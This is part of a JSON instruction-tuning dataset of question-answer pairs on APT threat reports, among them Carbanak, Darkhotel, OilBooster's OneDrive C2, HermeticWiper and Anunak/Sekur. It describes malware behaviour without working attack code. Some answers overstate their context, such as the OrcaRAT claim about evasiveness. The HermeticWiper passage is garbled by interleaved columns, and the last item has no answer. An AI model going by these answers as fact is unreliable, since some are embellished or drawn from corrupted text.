    "instruction": "OrcaRAT - A whale of a tale\nBy Dan Kelly and Tom Lancaster\nIt's every malware analyst's dream to be handed a sample which is, so far, unnamed by the AV community - especially when the malware in question may have links to a well-known APT group.\nIn my line of work I analyse several 'unknown' malware samples a week, but often it turns out that they are simply new variants of existing malware families. Recently I was fortunate enough to be handed something that not only had a low detection rate but, aside from heuristics, seemed to be relatively unknown to the top 40 anti-virus companies.\nIn this post I will walk you through the malware family we've dubbed \"OrcaRAT\".\nFirst of all, it is worth pointing out that most of the malware I see on a day-to-day basis is espionage orientated, and very rarely do the programmers and operators make much effort to cover their tracks. The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent.\nThe malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo[1] malware and happened across a malware sample (253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613) he didn't recognise. He immediately took the malware and passed it through first stage analysis, which involves running the file in a sandbox environment. After this, he handed it over for more in-depth capability analysis.\n\nAnswer this question based on the above context: How does the discovery of OrcaRAT differ from typical malware analysis processes, and what unique characteristics set it apart from commonly encountered malware?",
    "output": "The discovery of OrcaRAT stands out because it was initially unrecognized by the top 40 anti-virus companies, indicating a low detection rate and potential novelty. Unlike typical malware, which often consists of new variants of existing families, OrcaRAT appeared to be relatively unknown. This uniqueness was further highlighted by its association with infrastructure linked to Comfoo malware, suggesting potential ties to a well-known APT group. Additionally, while most espionage-oriented malware makes little effort to conceal its tracks, OrcaRAT exhibited characteristics that made it more challenging to detect and analyze, setting it apart from the usual malware encountered in day-to-day analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Carbanak\nThe Carbanak group is a criminal advanced persistent threat group whose attacks against dozens (potentially hundreds) of global financial institutions resulted in an estimated $1 billion in losses in the first half of 2014. Depending on the victim, the attacks are believed to have begun between December 2013 and June 2014. According to Kaspersky Labs, each victim bank lost $2.5 million to $10 million to the campaign. The victim financial institutions were located in Russia, the United States, Germany, China and Ukraine; additionally, the group may also have begun targeting organizations in Malaysia, Nepal, and Kuwait. The vast majority of victims (at least 52) are located in Russia. Overall, the group targeted at least 100 financial organizations at 300 IP addresses located in approximately 30 countries. Of the ~100 organizations targeted, Kaspersky believes that at least half suffered financial loss.\nThe Carbanak group is particularly significant because it demonstrates how the dangerous escalation of sophisticated cyber exploit kits, perpetuated by state sponsored groups and government agencies, has guided the development of complex and demonstratively effective criminal platforms that can financially harm private organizations and individuals alike. Consider that the Carbanak group stole an estimated $1 billion in less than 6 months. The loss to the global financial institutions, though meager compared to the entire global economy, can still lead to cascading global economic impacts within and outside the victim organizations.\nLike most APT groups, Carbanak attacks began with a spear phishing campaign. The malicious emails appeared as legitimate banking communique accompanied by attached Microsoft Word (97-2003) documents and Control Panel Applet (.CPL) files. The attachments infected victim systems with malware and with a backdoor based on the Carberp malware. It is also possible that some of the emails contained urls that redirected the victim to a landing page that delivered the malware in the background before forwarding the user to a familiar financial site. Analyzed malicious attachments reveal that the attackers exploited vulnerabilities in Microsoft Word 2003, 2007, and 2010 (CVE-2012-0158, and CVE-2014-1761). After successful exploitation of a vulnerability, the shellcode decrypts and the Carbanak backdoor is installed on the victim host. The Carbanak backdoor installs and then it re-installs itself into \"%system32%\\com\" as a copy of \"svhost.exe\" with the system, hidden, and read-only attributes. The initial version (delivered by the exploit) is then deleted. After installation, the backdoor connects to its C2 server through HTTP (with RC2+Base64 encryption) and downloads a file (kldconfig.plug) which details which process to monitor. The kit sets the Termservice service execution mode to auto to enable Remote Desktop Protocol (RDP). The backdoor provided access to the intranet of the victim organization. Next, the adversary probed the intranet for other vulnerable targets and specifically for critical financial systems. Typically, tens to hundreds of computers were infected before an admin system, with the necessary access, was compromised. If banking applications such as BLIZKO or IFOBS are discovered, then a special notification is sent to the C2 server to notify the adversary that financial systems were discovered.\nOnce the attackers discovered financial systems on the victim network, they deployed keyloggers, tools to hijack video capture, and screen capture tools to learn as much information as possible about the environment. The Carbanak tool kit typically logs keystrokes and takes screenshots every 20 seconds. The monitoring occurs by intercepting the ResumeThread call. The captured videos are recorded at low bandwidth and are used to help the attackers develop an operational picture of typical workflow, tool usage, and practices. In addition to training the adversary to transfer money, the monitoring also reduces the likelihood that the adversary will set off behavioral analytic systems. The remote administration tool, Ammyy Admin, might also\nbe installed on victim systems to ease remote access (the tool is whitelisted by legitimate system administrators in some corporate environments).\nAttackers studied the financial tools and applications installed on the victim hosts in order to maximize the potential gain from the compromised system. Rather than searching for exploits and flaws in the security and financial applications, the adversary meticulously recorded the activity of administrators in order to learn the necessary information and procedures to transfer money.  Files on captured C2 servers indicate that the adversary may also exfiltrate classified emails, manuals, cryptographic keys, and other information. When the adversary knew the necessary information and knew how to use the most powerful host applications, they would withdraw or transfer significant sums. The method of withdraw or transfer depended on the system, situation, and available resources (time, people, etc.). Observed methods of stealing cash include fraudulent online banking transfers, electronic cash transfers to banks in China and the United States, SWIFT transfers to compromised bank accounts, and remote commands to ATMs to spew cash onto the street at a specific date and time. In the instances where physical interaction with an ATM or bank personnel was necessary, the group would pay individuals to act as \"mules\" in the cash transfer.\nThe command and control infrastructure rotates every few weeks. It consists of Linux servers to issue commands, Windows servers used for remote connections, backup servers, and drop servers containing executables and additional components. Victim systems are catalogued in server logs according to the adversary's categorization.\n\nHow did the Carbanak group initiate their attacks against financial institutions, and what specific vulnerabilities did they exploit in Microsoft Word?",
    "output": "The Carbanak group initiated their attacks using a spear phishing campaign. They sent malicious emails that appeared as legitimate banking communications, accompanied by attached Microsoft Word (97-2003) documents and Control Panel Applet (.CPL) files. Some emails may have contained URLs redirecting victims to landing pages that delivered malware. The attackers exploited vulnerabilities in Microsoft Word 2003, 2007, and 2010, specifically CVE-2012-0158 and CVE-2014-1761. After successful exploitation, the shellcode decrypted and installed the Carbanak backdoor on the victim host.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why does the presence of a Remote Access Tool (RAT) like Poison Ivy (PIVY) often indicate a targeted attack known as an Advanced Persistent Threat (APT)?",
    "output": "The presence of a RAT like Poison Ivy often indicates an APT because, unlike malware focused on opportunistic cybercrime, RATs require a live person on the other side of the attack. This characteristic suggests that the attacker is specifically interested in the targeted organization and is actively involved in the attack, making it more personal and potentially more dangerous.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: introduction\nWhen unsuspecting guests, including situationally aware corporate executives and high-tech entrepreneurs, travel to a variety of hotels and connect to the internet, they are infected with a rare ApT Trojan posing as any one of several major software releases. These might be GoogleToolbar, Adobe flash, Windows Messenger, etc. This first stage of malware helps the attackers to identify more significant victims, leading to the selective download of more advanced stealing tools.\nAt the hotels, these installs are selectively distributed to targeted individuals. This group of attackers seems to know in advance when these individuals will arrive and depart from their high-end hotels. So, the attackers lay in wait until these travelers arrive and connect to the internet.\nThe fBi issued advisories about similar hotel incidents; Australian government officials produced similar, newsworthy accounts when they were infected. While an fBi announcement related to attacks on hotel guests overseas appeared in May 2012, related Darkhotel samples were already circulating back in 2007. And available Darkhotel server log data records connections as early as Jan 1, 2009. Additionally, seeding p2p networks with widely spread malware and 0-day spear-phishing attacks demonstrate that the Darkhotel ApT maintains an effective toolset and a long-running operation behind the questionable hospitality it shows its guests.\nAnswer this question: How does the Darkhotel APT group manage to target specific individuals at high-end hotels, and what methods do they use to infect these targets with malware?",
    "output": "The Darkhotel APT group manages to target specific individuals by having prior knowledge of their travel plans, including arrival and departure dates at high-end hotels. They lay in wait until these targeted individuals connect to the internet at the hotels. Once connected, the attackers distribute malware disguised as legitimate software updates, such as Google Toolbar, Adobe Flash, or Windows Messenger. This initial malware acts as a reconnaissance tool to identify more significant victims, which then leads to the selective download of more advanced stealing tools. The FBI has issued advisories about similar incidents, and Australian government officials have reported being infected in such attacks, indicating the effectiveness and longevity of the Darkhotel APT's operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Release Notes\n10/27: For clarification, Invincea has added additional notes in this version that the websites shown here and the 3rd party real-time ad networks are being used unwittingly and their resources misappropriated by malvertisers to target companies for persistent remote access, click fraud, and other nefarious activities. This is not a reflection on these companies, nor the services they provide. This paper highlights the problem for greater awareness so the industry collectively can combat this problem perhaps with more effective screening at the source prior to displaying ads.\n\nQuestion: In the context of Operation DeathClick, how does the unwitting involvement of third-party real-time ad networks and websites contribute to the success of malvertising campaigns? Additionally, what steps can the industry take to mitigate this issue?\n\nAnswer:",
    "output": "The unwitting involvement of third-party real-time ad networks and websites in Operation DeathClick contributes to the success of malvertising campaigns by allowing threat actors to misappropriate their resources for nefarious activities such as persistent remote access, click fraud, and other malicious endeavors. These legitimate entities are unknowingly used to deliver malicious ads to targeted companies. To mitigate this issue, the industry can implement more effective screening processes at the source before displaying ads. This would involve vetting advertisers more rigorously to ensure they are not front companies for malicious actors. By increasing awareness and collective efforts, the industry can work towards combating this problem more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key points discussed by Jen Weedon regarding Russia's strategic use of computer network exploitation and its implications for military operations?",
    "output": "Jen Weedon discusses Russia's strategic use of computer network exploitation (i.e., cyber espionage). She highlights that intelligence agencies can gather information on an industrial scale via the Internet, which can be used for any purpose, including tactical support to military operations. Weedon discusses strategies for creating a decisive information advantage, 'prepping' a battlefield through denial and deception, and how hackers might even cause real-world physical destruction. She details the technical aspects of suspected Russian cyber operations, including malware samples, hacker tactics, and compromised infrastructure, emphasizing the potential impact of these activities on military operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the attackers behind the Stuxnet APT obtain code signing certificates to sign their malicious drivers?",
    "output": "Obtain Capabilities: Code Signing Certificates is a technique used by adversaries to acquire code signing certificates that can be used to sign malicious code, making it appear legitimate. In the case of the Stuxnet APT, the attackers obtained code signing certificates from two Taiwanese companies, Realtek Semiconductor Corp. and JMicron Technology Corp. The certificates were used to sign the malicious drivers, including MRXCLS.sys and jmidebs.sys. It is suspected that the attackers may have obtained the certificates through physical theft or by purchasing them from another source, possibly using a front organization or stolen information from a previously compromised entity. The use of code signing certificates in Stuxnet highlights the importance of securing these certificates and ensuring their authenticity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the USB Worm component of the Crimson malware used by the Transparent Tribe APT group replicate itself and spread to other systems?",
    "output": "A computer worm is a standalone malware computer program that replicates itself in order to spread to other computers. In the case of the USB Worm component of the Crimson malware used by the Transparent Tribe APT group, it replicates itself by creating a copy of itself in the drive root directory of removable media, using the same directory name and changing the directory attribute to 'hidden'. This results in all the actual directories being hidden and replaced with a copy of the malware using the same directory name. The worm also uses an icon that mimics a Windows directory, tricking the user into executing the malware when trying to access a directory. Additionally, if the worm is executed from removable media, it will check if the 'Thin Client' or the 'Main Client' is running on the system, and if not, it will connect to a remote Crimson Server and try to use a specific 'USBW' command to download and execute the 'Thin Client' component.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Network communication\nFor C&C communication and exfiltration, OilBooster uses the Microsoft Graph API to access the shared OneDrive account, using a variety of HTTP GET, POST, PUT, and DELETE requests to the graph.microsoft.com host over the standard 443 port. For brevity, we will also refer to these requests as OneDrive API requests. The encrypted communication is facilitated by the statically linked\nOpenSSL library, which handles the SSL communication.\nTo authenticate with the OneDrive account, OilBooster first obtains the  from the Microsoft identity platform (the authorization server) by sending a POST request with the following body over port 443 to login.microsoftonline.com/common/oauth2/v2.0/token, using hardcoded credentials:\nclient_id=860b23a7-d484-481d-9fea-d3e6e129e249\n&redirect_uri=https://login.live.com/oauth20_desktop.srf\n&client_secret=<redacted>\n&refresh_token=<redacted>\n&grant_type=refresh_token\nOilBooster obtains a new access token this way, which will be used in the Authorization header of the subsequent OneDrive API requests, along with a new refresh token. OilBooster also has a backup channel to request a new refresh token from its C&C server after 10 consecutive unsuccessful connections to the OneDrive server. As shown in Figure 7, the new token can be acquired by sending a simple HTTP GET request on port 80 to host1[.]com/rt.ovf (a legitimate, likely compromised website), which should be followed by the new refresh token in cleartext in the HTTP response.\nThe various network connections made by OilBooster are summarized in Figure 8.\nAnswer this question: How does OilRig's OilBooster utilize the Microsoft Graph API for command and control (C&C) communication and data exfiltration? Describe the authentication process and the role of the OpenSSL library.",
    "output": "OilBooster uses the Microsoft Graph API to communicate with a shared OneDrive account for C&C communication and data exfiltration. This involves sending various HTTP requests (GET, POST, PUT, DELETE) to the graph.microsoft.com host over the standard port 443. The encrypted communication is handled by the statically linked OpenSSL library, which manages SSL communication. To authenticate with the OneDrive account, OilBooster first obtains an access token from the Microsoft identity platform by sending a POST request to login.microsoftonline.com/common/oauth2/v2.0/token with hardcoded credentials. The request includes parameters such as client_id, redirect_uri, client_secret, refresh_token, and grant_type set to 'refresh_token'. Upon successful authentication, OilBooster receives a new access token and refresh token, which are used in the Authorization header of subsequent OneDrive API requests. Additionally, OilBooster has a backup mechanism to request a new refresh token from its C&C server if there are 10 consecutive unsuccessful connections to the OneDrive server. This backup channel involves sending an HTTP GET request to a compromised website, which responds with a new refresh token in cleartext.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Technical Analysis\nMultiple infection vectors for the HermeticWiper malware have been .\nThe delivery of the malware to a Ukrainian organization followed a Server Message Block (SMB)-based attack on a Microsoft Exchange server on December 23, 2021. The adversary initially stole credentials, and a web shell was installed on January 16, 2022. HermeticWiper was finally deployed on February 23, 2022.\nA Lithuanian organization that received HermeticWiper was initially compromised in November 2021. The delivery mechanism was suspected by Symantec as being an Apache Tomcat exploit that executed a malicious PowerShell command. This attack similarly included a credential harvesting component, followed quickly by the delivery and execution of the wiper malware as a scheduled task.\nIn several of the attacks, a ransomware executable was delivered alongside HermeticWiper. The victims received a ransomware notification providing 2 email addresses: vote2024forjb@protonmail[.]com and stephanie.jones2024@ protonmail[.]com. Symantec considers it likely that the ransomware component was the victims. WhisperGate attacks used a similar methodology, wherein the attack was disguised as ransomware. Both WhisperGate and HermeticWiper used separate components to prevent a victim's system from booting and file corruption; however, the component that played the role of ransomware changed between the 2 attacks. With WhisperGate, the wiper itself masqueraded as ransomware; however, with the HermeticWiper attacks, it was the file corrupter instead.\nESET reported that in one instance they observed, the malware was dropped via default Group Policy Objects (GPO), indicating that the adversaries almost certainly had control of an Active Directory server on the network.\nHermeticWiper's primary purpose is to corrupt the NTFS and/or FAT file systems of a victim's machine to prevent it from booting correctly. It was written in Visual Studio 2008 and 2015 in a combination of C and assembly and uses an included kernel driver to implement much of its disk access functionality. The use of a kernel driver instead of conventional Windows API calls is to evade detections that may catch the higher-level API calls being made. The compiler timestamps for 2 samples show that they were compiled on December 28, 2021, and 1 other sample shows February 23, 2022. Although timestamps can be forged, the timestamp from December 28, 2021, could be used to determine how far in advance this operation was planned. Each sample is signed using what was, at the time, a valid certificate issued to Hermetica Digital Ltd. Since the malware's discovery, the certificate has since been revoked by the Certificate Authority, as shown in Figure 1 above.\nUpon execution, the wiper adjusts its process token privileges to acquire SeBackupPrivilege and SeShutdownPrivilege in order to obtain read privileges to any files and eventually shut down the system before terminating. Next, it determines the Windows version and bitness (x86 or x86_64) of the victim's machine in order to determine which kernel driver, located in the PE's resource section, to later load. The kernel drivers are legitimate, benign software used by EaseUS's Partition Master and are signed with a certificate issued to EaseUS's parent company, CHENGDU YIWO Tech Development Co., Ltd., shown in Figure 2 below. Although the certificate has expired, newer versions of Windows 10 allow for kernel drivers with certificates issued before July 29, 2015, to be loaded.\nTo create the service, the process's token privileges are adjusted again to add SeLoadDriverPrivilege. A service is then created, configured, and started. Once the driver is successfully loaded, the created service's registry entry is removed from HKLM\\SYSTEM\\CurrentControlSet\\services\\. Next, the Volume Shadow Service (VSS) is stopped and disabled, as shown in Figure 4, to make recovery more difficult.\nThe wiper then begins to iterate through all physical drives on the system one at a time by attempting to access \\\\.\\PhysicalDrive<1-100>. For each drive, junk data is written to seemingly random locations of the disk in order to corrupt it. Additionally, the partitions on each physical disk are enumerated and any identified as FAT or NTFS file systems are corrupted by writing random data to the file system header. Although public reporting has stated that the MBR is \"wiped\", which typically means the MBR is overwritten, in our analysis we have concluded that only the file system is corrupted along with random locations on the disk. The end result similarly results in a loss of the stored data and inability of the victim machine to boot. Appendix A provides the output from a tool, , that captured the SetFilePointerEX and WriteFile API calls used to corrupt the hard drives on the victim's machine. There were no writes to the \"0\" index, where the MBR would reside, however there are writes to the index, 1048576, which is the location of the NTFS file system header. The additional writes are to seemingly random locations on disk.\nThe corruption of the file systems goes beyond a simple MBR overwrite and is more effective because it impacts a (i.e., MBR, GPT). This technique is more robust than the MBR overwrite used in the WhisperGate attacks, where (<https://www.recordedfuture.com/whispergate-malware-corrupts-computers-ukraine/>)we showed that GPT-style disks could recover from the MBR overwrite.\nThe kernel drivers are stored as RCDATA in the PE file's victim's ability to boot regardless of the disk partitioning scheme resource section, as shown in Figure 3 below. Each driver is compressed using Microsoft's , based on the Lempel\u2013Ziv\u2013Storer\u2013Szymanski (LZSS) .\nAfter corrupting the file system the wiper disables the ShowCompColor and ShowInfoTip values in the Software\\ Microsoft\\CurrentVersion\\Explorer\\Advanced registry key in order to prevent encrypted NTFS files from showing in color and showing pop-up descriptions for folders, respectively. Then\nAfter locating the correct driver, the wiper then proceeds to disable if the victim is running a 64-bit OS. This prevents 64-bit systems from loading 32-bit kernel drivers from the %windir%\\SysWOW64\\drivers directory and instead forces them to use %windir%\\system32\\drivers, where the malware will eventually place the kernel driver. it proceeds to corrupt logs and data on NTFS file systems.\nNext, Crash Dumps are disabled by modifying the registry Finally, the wiper attempts to shut the system down with a value \"CrashDumpEnabled\" to 0 for the key HKLM\\SYSTEM\\ call to InitiateSystemShutdownExW. Once the victim machine is CurrentControlSet\\Control\\CrashControl. This is likely done to rebooted, the user is presented with an error message indicating avoid writing a crash dump to disk when the program terminates. that their system cannot boot. In the case of MBR-style disks,\nThe compressed driver resource is then written to the the victim is presented with a message similar to the one shown %windir%\\system32\\drivers directory with a name consisting of in Figure 5; or in the case of GPT-style disks, the one shown 2 pseudorandom lowercase characters followed by \"dr\". Then in Figure 6. In both cases, although the MBR is still intact, the driver is decompressed, and a service with the same name the system is unable to boot due to the corrupted file system is temporarily created to load the driver. partition containing the Operating System.\nMedium Headline: PartyTicket\nInsikt Group analyzed the ransomware associated with the HermeticWiper malware, dubbed PartyTicket. The ransomware contained several path strings and function names that allude to the White House, Joe Biden, and elections, among other topics, seen below in Figures 7 and 8.\nFigure 8: Ransomware function names (Source: Recorded Future)\nSimilarly, the ransom note dropped by the malware contained email addresses on similar topics, and the encrypted files were renamed with the suffix \"[vote2024forjb@protonmail[.]com]. encryptedJB\", as shown in Figure 10.\nFigure 10 below shows the ransomware note dropped by PartyTicket. While Insikt Group cannot currently attribute the ransomware to any specific group, the note differs substantially from that of other ransomware groups we have seen.\nThere is no \"branding\" identifying a particular ransomware group responsible for the attack, and there are several misspellings and grammatical errors throughout the note. As a result, the ransomware component of the HermeticWiper malware is unlikely to have been developed and distributed by a criminal ransomware group. Further, the malware contains a list of files, shown in Figure 12 below, that it seeks to encrypt. Unlike all other recent, criminal-operated ransomware variants, this list includes files that are key to the ability of the victim system to operate, including .dll and .exe files. This further suggests that this is not legitimate ransomware but rather a destructive piece of malware.\n-inf .acl, .avi .bat .bmp .cab .cfg .chm .cmd .com .crt .css .dat .dip .dll .doc .dot .exe .gif .htm .ico .iso .jpg .mp3 .msi .odt .one .ova .pdf .png .ppt .pub .rar .rtf .sfx .sql .txt .url .vdi .vsd .wma .wmv .wtv .xls .xml .xps .zip\nFigure 11: File extensions the \"ransomware\" seeks to encrypt (Source: Recorded Future)\n\nAnswer this question based on the above context: What is the significance of the compiler timestamps found in the HermeticWiper samples, and how can they provide insights into the planning of the operation?",
    "output": "The compiler timestamps found in the HermeticWiper samples indicate when the malware was compiled. Two samples were compiled on December 28, 2021, and another on February 23, 2022. Although timestamps can be forged, the December 28, 2021, timestamp suggests that the operation was planned well in advance. This information can provide insights into the adversaries' preparation and coordination efforts, indicating a potentially sophisticated and well-resourced threat actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: 2.1. OVERVIEW\nDuring the course of this effort, RSA observed many different Remote Access Trojans (RATs) associated with this group. Several are based on crimeware/ banker Trojans that are in use by different criminal actors, but are uniquely customized for Carbanak/FIN7. The following sections outline the capabilities of each RAT and discuss possible detection methods.\n2.1.1. Anunak/Sekur The Anunak, or Sekur, Trojan has been\u2014and may still be\u2014the mainstay of the Carbanak/FIN7 syndicate. A custom configurable Trojan, it has undergone minor changes over the past several years, most notably to its communications protocols.\nThe Anunak/Sekur Trojan is a self-contained dropper/Trojan combination. If executed outside of its configured path, it will entrench itself and remove the original file. The Trojan is typically packed or \"crypted\" (a packer modified over time using encryption, encoding or compression methodologies), making static analysis difficult and rendering signatures useless. The Trojan begins by resolving Win32 API addresses and uses RtlDecompressBuffer to expand the compressed payload DLL. The Trojan starts the Service Host executable, svchost.exe, in a suspended state (Figure 1).\nThe malware then allocates executable memory inside the svchost.exe address space, unpacks and injects the expanded DLL, and creates the main thread for the Anunak/Sekur malware. The Trojan is then copied into two startup directories with a name based off the MAC address and machine name (Figures 2 and 3).\nThe Trojan then enumerates the running processes, looking for specific antivirus vendors and killing their worker processes to increase chances of persistence. The Trojan also drops and reads a configuration file with initial instructions into the \"C:\\ProgramData\\Mozilla\\\" directory with a filename based off the MAC address and machine name (Figure 4).\ngoes in-depth into the observed variants, commands the Trojan receives and configurations discovered in the wild. RSA NetWitness\u00ae Endpoint can detect this injected DLL (Figure 5) and triggers many instant indicators of compromise (IIOCs) (Figure 6) that ship with the product, by default.\nFigure 5: Injected DLLs Detected by RSA NetWitness Endpoint\nThe Anunak/Sekur Trojan may be configured to communicate with the Command and Control [C2] server in two ways: via HTTP or a custom protocol to a hardcoded IP address. Often the Trojan is configured with both methods. The HTTP request is easily detected with RSA NetWitness Logs and Packets using the RSA NetWitness Hunting Pack and following the recommendations in the HTTP section. The HTTP method uses the GET (Figure 7) and POST (Figure 8) methods to create a covert, bi-directional communication channel with the C2. It generally has very few HTTP headers and oftentimes uses the default User-Agent configured in the Windows Registry.\nThis type of HTTP C2 communication is common to many malware families and is a good reason to follow up any detection and not treat it as \"routine.\" Pivoting into RSA NetWitness Endpoint and finding the module creating the connections leads us to the injected DLLs and tracking data behavior (Figure 9).\nFigure 9: Anunak/Sekur Network Tracking Data\nSince RSA NetWitness Endpoint downloads the injected DLL, you can right-click the DLL, select analyze and view the strings. The configuration path \"C:\\\nProgramData\\Mozilla\\<varies>.bin\" should be visible in the DLL's strings, and discovery of this activity can be automated with a YARA signature.\nThe second method of C2, a custom TCP-based protocol, is more difficult to find. The protocol has evolved over the years\u2014most recent observations showing it's now fully encrypted\u2014making the data appear random. However, there is a distinct handshake in the latest encrypted version. After the TCP handshake, the Trojan sends packet with a 64-byte payload, which the server acknowledges. The Trojan then sends a packet with a 224-byte payload, which the server also acknowledges (Figure 10). This is followed by the server sending a packet with a 32-byte payload (Figure 11).\nWhen the RSA NetWitness packet decoder sees this sequence, the metadata \"sekur handshake\" is registered in the Indicators of Compromise field (Figure 12). While we have high confidence in these results, please be aware that under rare circumstances this parser may false alarm on sessions that have the same handshake pattern and aren't actually the Trojan's C2 communications. Any Sekur handshake hits should be investigated on the host using the above information on the behavior of this Trojan.\n\nWhat are the two primary methods of communication used by the Anunak/Sekur Trojan to interact with its Command and Control (C2) server? Describe how each method works and how they can be detected.",
    "output": "The Anunak/Sekur Trojan communicates with its Command and Control (C2) server using two primary methods: via HTTP and a custom TCP-based protocol. The HTTP method uses GET and POST requests to create a covert, bi-directional communication channel with the C2 server. This method is easily detected using tools like RSA NetWitness Logs and Packets with the RSA NetWitness Hunting Pack. The HTTP requests generally have very few HTTP headers and often use the default User-Agent configured in the Windows Registry. The second method, a custom TCP-based protocol, is more difficult to detect because it is fully encrypted, making the data appear random. However, it has a distinct handshake pattern. After the TCP handshake, the Trojan sends a packet with a 64-byte payload, which the server acknowledges. The Trojan then sends a packet with a 224-byte payload, which the server also acknowledges. This is followed by the server sending a packet with a 32-byte payload. When the RSA NetWitness packet decoder sees this sequence, the metadata 'sekur handshake' is registered in the Indicators of Compromise field.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Cyberattacks knock out Georgia's Internet presence\nLarge-scale attacks, traffic rerouting traced to Russian hacker hosting network\nAugust 11, 2008 (Computerworld) Hackers, perhaps affiliated with a well-known Russian criminal network, have attacked and hijacked Web sites belonging to Georgia, the former Soviet republic now in the fourth day of war with Russia, a security researcher claimed on Sunday.\nSome Georgian government and commercial sites are unavailable, while others may have been hijacked, said Jart Armin, a researcher who tracks the notorious Russian Business Network (RBN), a malware and criminal hosting network.\n\"Many of Georgia's Internet servers were under external control from late Thursday,\" Armin said early Saturday in an entry on his Web site. According to his research, the government's sites dedicated to the Ministry of Foreign Affairs, the Ministry of Defense, and the country's president, Mikhail Saakashvili, have been blocked completely, or traffic to and from those sites' servers have been redirected to servers actually located in Russia and Turkey.\nAs of midnight Eastern time on Sunday, Georgia's presidential and defense ministry sites were unavailable from the U.S. Although the foreign ministry's site remained online, the most recent news item was dated Aug. 8, the day Georgian and Russian forces first clashed.\nArmin warned that Georgian sites that appeared online may actually be bogus. \"Use caution with any Web sites that appear of a Georgia official source but are without any recent news [such as those dated Saturday, Aug. 9, or Sunday, Aug. 10], as these may be fraudulent,\" he said in another entry posted midafternoon on Sunday.\nStatements from Georgia's foreign ministry have appeared in a blog hosted on Google, perhaps in an attempt to circumvent attacks.\nResearchers at the Shadowserver Foundation, which tracks malicious Internet activity, confirmed some of Armin's claims. \"We are now seeing new attacks against .ge sites [Editor's note: .ge is the top-level domain for Georgia.] ... www.parliament.ge and president.gov.ge are currently being hit with HTTP floods,\" the researchers said in a Sunday update to a July post.\nOn Saturday, Armin reported that key sections of Georgia's Internet traffic had been rerouted through servers based in Russia and Turkey, where the traffic was either blocked or diverted. The Russian and Turkish servers Armin identified, he said, \"are well known to be under the control of RBN and influenced by the Russian government.\"\nRBN, which pulled up stakes last year and shifted network operations to China in an attempt to avoid scrutiny, has been fingered for a wide range of criminal activities, including a massive subversion of Web sites last March.\nLater on Saturday, Armin added that network administrators in Germany had been able to temporarily reroute some Georgian Internet traffic directly to servers run by Deutsche Telekom AG. Within hours, however, the traffic had been again diverted to Russian servers, this time to ones based in Moscow.\nThe attacks are reminiscent of other coordinated campaigns against Estonian government Web sites in April and May 2007 and against about 300 Lithuanian sites on July 1. Like Georgia, both countries are former republics in the Soviet Union.\nThree weeks ago, a distributed denial-of-service attack knocked Georgia's presidential site offline for about a day.\nLate Sunday, Russian ground forces were reported advancing toward Gori, an important transportation hub in central Georgia.\nMedium Headline: Georgia: Russia 'conducting cyber war'\nSeveral Georgian state computer servers have been under external control since shortly before Russia's armed intervention into the state commenced on Friday, leaving its online presence in disarray.\nWhile the official website of Mikheil Saakashvili, the Georgian President, has become available again, the central government site, as well as the homepages for the Ministry of Foreign Affairs and Ministry of Defence, remained down. Some commercial websites have also been hijacked.\nThe Georgian Government said that the disruption was caused by attacks carried out by Russia as part of the ongoing conflict between the two states over the Georgian province of South Ossetia.\nIn a statement released via a replacement website built on Google's blog-hosting service, the Georgian Ministry of Foreign Affairs said: \"A cyber warfare campaign by Russia is seriously disrupting many Georgian websites, including that of the Ministry of Foreign Affairs.\"\nBarack Obama, the Democratic US Presidential candidate, has demanded Moscow halt the internet attacks as well as observing a ceasefire on the ground.\nLast April the computer systems of the Estonian Government came under attack in a coordinated three-week assault widely credited to state-sponsored Russian hackers. The wave of attacks came after a row erupted over the removal of the Bronze Soldier Soviet war memorial in Tallinn, the Estonian capital. The websites of government departments, political parties, banks and newspapers were all targeted.\nAnalysts have immediately accused the Russian Business Network (RBN), a network of criminal hackers with close links to the Russian mafia and government, of the Georgian attacks.\nJart Armin, a researcher who runs a website tracking the activity of the RBN, has released data claiming to show that visits to Georgian sites had been rerouted through servers in Russia and Turkey, where the traffic was blocked. Armin said the servers \"are well known to be under the control of RBN and influenced by the Russian Government.\"\nMr Armin said that administrators in Germany had intervened at the weekend, temporarily making the Georgian sites available by re-routing their traffic through German servers run by Deutsche Telekom. Within hours, however, control over the traffic had been wrested back, this time to servers based in Moscow.\nAs in the barrage against Estonian websites last year, the Georgian sites are being bombarded by a distributed denial-of-service (DDoS) attack, in which\nhackers direct their computers to simultaneously flood a site with thousands of visits in order to overload it and bring it offline.\nThe Shadowserver Foundation, which tracks serious hacking, confirmed: \"We are now seeing new attacks against .ge sites - www.parliament.ge and president.gov.ge are currently being hit with http floods.\"\nMr Armin warned that official Georgian sites that did appear online may have been hijacked and be displaying bogus content. He said in a post on his site: \"Use caution with any web sites that appear of a Georgia official source but are without any recent news ... as these may be fraudulent.\"\nThe Baltic Business News website reported that Estonia has offered to send a specialist online security team to Georgia\nHowever a spokesman from Estonia's Development Centre of State Information Systems said Georgia had not made a formal request. \"This will be decided by the government,\" he said\nAnswer this question: What similarities can be drawn between the cyberattacks on Georgia and previous incidents involving Estonia and Lithuania? How did these attacks reflect a broader pattern of cyber warfare tactics?",
